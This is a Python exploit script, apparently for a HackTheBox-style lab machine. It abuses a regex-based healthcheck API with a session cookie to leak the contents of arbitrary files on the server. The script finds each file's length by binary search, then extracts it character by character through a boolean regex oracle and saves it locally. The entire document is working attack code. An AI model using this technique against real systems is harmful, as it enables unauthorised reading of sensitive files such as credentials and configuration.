#!/usr/bin/env python3

import requests

from datetime import timedelta
from pwn import log, signal, string, sys, time


signal.signal(signal.SIGINT, lambda *_: log.warning('Exiting...') or exit(1))


def transform(pattern: str) -> str:
    return ''.join(map(lambda c: fr'\x{c.encode().hex()}', pattern))


def test_pattern(pattern: str) -> bool:
    global cookie
    global filename

    r = requests.post('http://dev.rainycloud.htb/api/healthcheck',
        data={'file': filename, 'type': 'CUSTOM', 'pattern': pattern},
        headers={'Cookie': f'session={cookie}'}
    )

    if r.status_code == 500:
        return False

    return r.json().get('result', False)


def main():
    global cookie
    global filename

    if len(sys.argv) != 3:
        log.warning(f'Usage: python3 {sys.argv[0]} <cookie> <remote-file>')
        exit(1)

    cookie = sys.argv[1]
    filename = sys.argv[2]

    a, b = 1, 100000

    while a < b - 1:
        m = (a + b) // 2

        if test_pattern('[\s\S]{%d,}' % m):
            a = m
        else:
            b = m

    length = m if test_pattern('[\s\S]{%d,}' % m) else m - 1
    log.success(f'Length: {length}')
    now = time.time()

    content = []
    prog = log.progress('Content')

    while len(content) != length:
        for c in ' \n' + string.printable[:-6]:
            if test_pattern(transform(content + [c])):
                content.append(c)
                prog.status(f'{len(content)} / {length}\n\n' + ''.join(content))
                break

    with open(filename[1:].replace('/', '_'), 'w') as f:
        f.write(''.join(content))

    prog.success(f'{len(content)} / {length}\n\n' + ''.join(content))
    log.success(f"File saved as: {filename[1:].replace('/', '_')}")
    log.info(f'Elapsed time: {timedelta(seconds=int(time.time() - now))}')


if __name__ == '__main__':
    main()
